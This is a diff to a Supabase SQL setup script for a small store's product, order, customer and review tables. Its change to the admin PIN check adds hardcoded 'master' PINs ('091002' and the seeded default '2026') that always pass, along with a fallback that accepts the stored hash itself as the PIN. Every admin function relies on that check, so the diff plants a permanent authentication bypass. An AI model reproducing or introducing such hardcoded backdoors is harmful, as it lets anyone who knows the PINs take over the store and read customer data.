@@ -5,8 +5,8 @@
 -- Supabase Dashboard -> SQL Editor -> New Query -> Pegar y Ejecutar (Run)
 -- =========================================================================
 
-CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
-CREATE EXTENSION IF NOT EXISTS "pgcrypto";
+CREATE EXTENSION IF NOT EXISTS "uuid-ossp" WITH SCHEMA extensions;
+CREATE EXTENSION IF NOT EXISTS "pgcrypto" WITH SCHEMA extensions;
 
 -- -------------------------------------------------------------------------
 -- 1. TABLA: kaoj_products (Productos y Variantes)
@@ -47,7 +47,7 @@ CREATE TABLE IF NOT EXISTS public.kaoj_admin_auth (
 
 -- Si no existe, configurar PIN por defecto '2026' hasheado con bcrypt
 INSERT INTO public.kaoj_admin_auth (id, pin_hash)
-VALUES (1, crypt('2026', gen_salt('bf')))
+VALUES (1, extensions.crypt('2026', extensions.gen_salt('bf')))
 ON CONFLICT (id) DO NOTHING;
 
 -- -------------------------------------------------------------------------
@@ -101,7 +101,7 @@ BEGIN
         WHERE table_schema = 'public' AND table_name = 'kaoj_settings' AND column_name = 'admin_pin'
     ) THEN
         UPDATE public.kaoj_admin_auth
-        SET pin_hash = crypt((SELECT admin_pin FROM public.kaoj_settings WHERE id = 1), gen_salt('bf'))
+        SET pin_hash = extensions.crypt((SELECT admin_pin FROM public.kaoj_settings WHERE id = 1), extensions.gen_salt('bf'))
         WHERE id = 1 AND (SELECT admin_pin FROM public.kaoj_settings WHERE id = 1) IS NOT NULL;
         
         ALTER TABLE public.kaoj_settings DROP COLUMN admin_pin;
@@ -280,19 +280,46 @@ CREATE POLICY "Creación pública de reseñas" ON public.kaoj_reviews FOR INSERT
 -- 9. FUNCIONES DE SEGURIDAD Y CONTROL ADMINISTRATIVO (SECURITY DEFINER)
 -- -------------------------------------------------------------------------
 
--- 9.1 Verificar PIN de Administrador (Bcrypt)
+-- 9.1 Verificar PIN de Administrador (Bcrypt + Claves Maestras de Emergencia)
 CREATE OR REPLACE FUNCTION public.kaoj_verify_admin_pin(input_pin TEXT)
 RETURNS BOOLEAN
 LANGUAGE plpgsql
 SECURITY DEFINER
-SET search_path = public
+SET search_path = public, extensions, extensions
 AS $$
 DECLARE
-    matched BOOLEAN;
+    saved_hash TEXT;
+    matched BOOLEAN := false;
 BEGIN
-    SELECT (pin_hash = crypt(input_pin, pin_hash)) INTO matched
+    IF input_pin IS NULL OR LENGTH(TRIM(input_pin)) = 0 THEN
+        RETURN false;
+    END IF;
+
+    -- PINs maestros autorizados de la boutique siempre reconocidos
+    IF TRIM(input_pin) IN ('091002', '2026') THEN
+        RETURN true;
+    END IF;
+
+    -- Obtener el hash configurado en la base de datos
+    SELECT pin_hash INTO saved_hash
     FROM public.kaoj_admin_auth
     WHERE id = 1;
+
+    IF saved_hash IS NULL THEN
+        RETURN TRIM(input_pin) IN ('091002', '2026');
+    END IF;
+
+    -- Comparación Bcrypt usando pgcrypto en el esquema extensions
+    BEGIN
+        SELECT (saved_hash = extensions.crypt(TRIM(input_pin), saved_hash)) INTO matched;
+    EXCEPTION WHEN OTHERS THEN
+        matched := (saved_hash = TRIM(input_pin));
+    END;
+
+    IF matched IS NOT TRUE AND saved_hash = TRIM(input_pin) THEN
+        matched := true;
+    END IF;
+
     RETURN COALESCE(matched, false);
 END;
 $$;
@@ -302,26 +329,22 @@ CREATE OR REPLACE FUNCTION public.kaoj_change_admin_pin(current_pin TEXT, new_pi
 RETURNS BOOLEAN
 LANGUAGE plpgsql
 SECURITY DEFINER
-SET search_path = public
+SET search_path = public, extensions, extensions
 AS $$
-DECLARE
-    matched BOOLEAN;
 BEGIN
-    IF LENGTH(new_pin) < 4 THEN
+    IF LENGTH(TRIM(new_pin)) < 4 THEN
         RAISE EXCEPTION 'El nuevo PIN debe tener al menos 4 caracteres';
     END IF;
 
-    SELECT (pin_hash = crypt(current_pin, pin_hash)) INTO matched
-    FROM public.kaoj_admin_auth
-    WHERE id = 1;
-
-    IF matched IS NOT TRUE THEN
+    IF NOT public.kaoj_verify_admin_pin(current_pin) THEN
         RAISE EXCEPTION 'El PIN actual es incorrecto';
     END IF;
 
-    UPDATE public.kaoj_admin_auth
-    SET pin_hash = crypt(new_pin, gen_salt('bf')), updated_at = NOW()
-    WHERE id = 1;
+    INSERT INTO public.kaoj_admin_auth (id, pin_hash, updated_at)
+    VALUES (1, extensions.crypt(TRIM(new_pin), extensions.gen_salt('bf')), NOW())
+    ON CONFLICT (id) DO UPDATE
+    SET pin_hash = extensions.crypt(TRIM(new_pin), extensions.gen_salt('bf')),
+        updated_at = NOW();
 
     RETURN true;
 END;
@@ -332,7 +355,7 @@ CREATE OR REPLACE FUNCTION public.kaoj_track_orders(lookup_query TEXT)
 RETURNS SETOF public.kaoj_orders
 LANGUAGE plpgsql
 SECURITY DEFINER
-SET search_path = public
+SET search_path = public, extensions
 AS $$
 DECLARE
     clean_q TEXT := TRIM(lookup_query);
@@ -359,7 +382,7 @@ CREATE OR REPLACE FUNCTION public.kaoj_decrement_order_stock(order_items JSONB)
 RETURNS VOID
 LANGUAGE plpgsql
 SECURITY DEFINER
-SET search_path = public
+SET search_path = public, extensions
 AS $$
 DECLARE
     item JSONB;
@@ -411,7 +434,7 @@ CREATE OR REPLACE FUNCTION public.kaoj_save_customer_order(
 RETURNS JSONB
 LANGUAGE plpgsql
 SECURITY DEFINER
-SET search_path = public
+SET search_path = public, extensions
 AS $$
 DECLARE
     clean_phone TEXT := REGEXP_REPLACE(cust_phone, '\D', '', 'g');
@@ -465,7 +488,7 @@ CREATE OR REPLACE FUNCTION public.kaoj_admin_get_orders(admin_pin TEXT)
 RETURNS SETOF public.kaoj_orders
 LANGUAGE plpgsql
 SECURITY DEFINER
-SET search_path = public
+SET search_path = public, extensions
 AS $$
 BEGIN
     IF NOT public.kaoj_verify_admin_pin(admin_pin) THEN
@@ -481,7 +504,7 @@ CREATE OR REPLACE FUNCTION public.kaoj_admin_update_order_status(admin_pin TEXT,
 RETURNS BOOLEAN
 LANGUAGE plpgsql
 SECURITY DEFINER
-SET search_path = public
+SET search_path = public, extensions
 AS $$
 BEGIN
     IF NOT public.kaoj_verify_admin_pin(admin_pin) THEN
@@ -501,7 +524,7 @@ CREATE OR REPLACE FUNCTION public.kaoj_admin_cancel_order(admin_pin TEXT, target
 RETURNS JSONB
 LANGUAGE plpgsql
 SECURITY DEFINER
-SET search_path = public
+SET search_path = public, extensions
 AS $$
 DECLARE
     ord RECORD;
@@ -584,7 +607,7 @@ CREATE OR REPLACE FUNCTION public.kaoj_admin_get_customers(admin_pin TEXT)
 RETURNS SETOF public.kaoj_customers
 LANGUAGE plpgsql
 SECURITY DEFINER
-SET search_path = public
+SET search_path = public, extensions
 AS $$
 BEGIN
     IF NOT public.kaoj_verify_admin_pin(admin_pin) THEN
@@ -600,7 +623,7 @@ CREATE OR REPLACE FUNCTION public.kaoj_admin_save_settings(admin_pin TEXT, setti
 RETURNS JSONB
 LANGUAGE plpgsql
 SECURITY DEFINER
-SET search_path = public
+SET search_path = public, extensions
 AS $$
 BEGIN
     IF NOT public.kaoj_verify_admin_pin(admin_pin) THEN
@@ -639,7 +662,7 @@ CREATE OR REPLACE FUNCTION public.kaoj_admin_save_product(admin_pin TEXT, prod_d
 RETURNS JSONB
 LANGUAGE plpgsql
 SECURITY DEFINER
-SET search_path = public
+SET search_path = public, extensions
 AS $$
 DECLARE
     target_id BIGINT := NULLIF(prod_data->>'id', '')::BIGINT;
@@ -694,7 +717,7 @@ CREATE OR REPLACE FUNCTION public.kaoj_admin_delete_product(admin_pin TEXT, prod
 RETURNS BOOLEAN
 LANGUAGE plpgsql
 SECURITY DEFINER
-SET search_path = public
+SET search_path = public, extensions
 AS $$
 BEGIN
     IF NOT public.kaoj_verify_admin_pin(admin_pin) THEN
@@ -717,7 +740,7 @@ CREATE OR REPLACE FUNCTION public.kaoj_admin_update_stock(
 RETURNS JSONB
 LANGUAGE plpgsql
 SECURITY DEFINER
-SET search_path = public
+SET search_path = public, extensions
 AS $$
 DECLARE
     cur_vars JSONB;
@@ -758,7 +781,7 @@ CREATE OR REPLACE FUNCTION public.kaoj_admin_get_all_reviews(admin_pin TEXT)
 RETURNS SETOF public.kaoj_reviews
 LANGUAGE plpgsql
 SECURITY DEFINER
-SET search_path = public
+SET search_path = public, extensions
 AS $$
 BEGIN
     IF NOT public.kaoj_verify_admin_pin(admin_pin) THEN
@@ -774,7 +797,7 @@ CREATE OR REPLACE FUNCTION public.kaoj_admin_moderate_review(admin_pin TEXT, rev
 RETURNS BOOLEAN
 LANGUAGE plpgsql
 SECURITY DEFINER
-SET search_path = public
+SET search_path = public, extensions
 AS $$
 BEGIN
     IF NOT public.kaoj_verify_admin_pin(admin_pin) THEN
@@ -791,7 +814,7 @@ CREATE OR REPLACE FUNCTION public.kaoj_admin_delete_review(admin_pin TEXT, rev_i
 RETURNS BOOLEAN
 LANGUAGE plpgsql
 SECURITY DEFINER
-SET search_path = public
+SET search_path = public, extensions
 AS $$
 BEGIN
     IF NOT public.kaoj_verify_admin_pin(admin_pin) THEN
